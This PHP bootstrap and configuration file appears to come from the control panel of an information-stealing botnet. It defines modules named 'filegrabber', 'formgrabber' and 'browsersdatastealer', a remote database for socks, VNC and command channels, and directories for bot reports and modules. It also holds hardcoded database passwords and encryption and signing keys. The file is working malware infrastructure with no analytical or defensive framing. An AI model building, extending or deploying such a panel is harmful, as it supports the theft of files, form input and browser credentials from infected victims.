<?php
/**
 * cfg for local DB
 */
define('DATABASE_SOURCE_NAME', 'mysql:dbname=bpanel;host=localhost');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'bpanel');
define('DATABASE_USER_NAME', 'root');
define('DATABASE_USER_PASSWORD', '');

/**
 * Unique keys and secrets
 */
define('RC4_CRYPT_KEY', 'a33aed8f3134926783dc39f9a7f94783');
define('XSALSA20_CRYPT_KEY', 'a33aed8f3134926783dc39f9a7f94783');
define('ED25519_SECRET', '2ca128f6d3dc3a174d24e8c7d78262b4');

/**
 * cfg for remote DB (socks,vnc,cmd)
 */
define('REMOTE_DATABASE_SOURCE_NAME', 'mysql:dbname=backserver;host=127.0.0.1:3306');
define('REMOTE_DATABASE_HOST', '127.0.0.1:3306');
define('REMOTE_DATABASE_NAME', 'backserver');
define('REMOTE_DATABASE_USER_NAME', 'backserver_user');
define('REMOTE_DATABASE_USER_PASSWORD', '123');

// Tracing
const TRACE_ENABLED = true;

// PATHS
const PANEL_PATH = '';
const LOG_DUMP_PATH = 'files' . DIRECTORY_SEPARATOR . 'log_dumps' . DIRECTORY_SEPARATOR;
$CURRENT_PATH = '/';

// services magic
const SERVICES_MAGIC = array(
    'filegrabber' => '1',
    'formgrabber' => '2',
    'browsersdatastealer' => '3'
);

const REPORTS_DIRECTORY = 'files/bots/';
const MODULES_DIRECTORY = 'files/modules/';

date_default_timezone_set('Europe/Moscow');

// enums
require_once 'enums/ModuleStatus.php';
require_once 'enums/TaskStatus.php';
require_once 'enums/LogLevel.php';

// utils
require_once 'modules/needed_funcs.php';

// connect core
require_once 'core/model.php';
require_once 'core/view.php';
require_once 'core/controller.php';

// wrapper for PDO
require_once 'modules/dbModel.php';

// singletons for DB and RDB
require_once 'modules/DBClient.php';
require_once 'modules/RDBClient.php';

require_once 'modules/Logger.php';

//protobuf
require_once 'modules/protobuf/message/pb_message.php';

// ip to location
require_once 'modules/geo2/ip2location.class.php';

// crypt
require_once 'modules/rc4Crypt.php';
require_once 'modules/Crypt.php';

// sign
require_once 'modules/SignEd25519.php';

//authorization
require_once 'modules/authorization.php';

//ssp for datatables
require_once 'modules/datatables/ssp.class.php';
require_once 'modules/datatables/ssp.customized.class.php';

require_once 'modules/zip_saver/ZipSaver.php';

require_once 'core/route.php';
Route::start(); // route start
?>
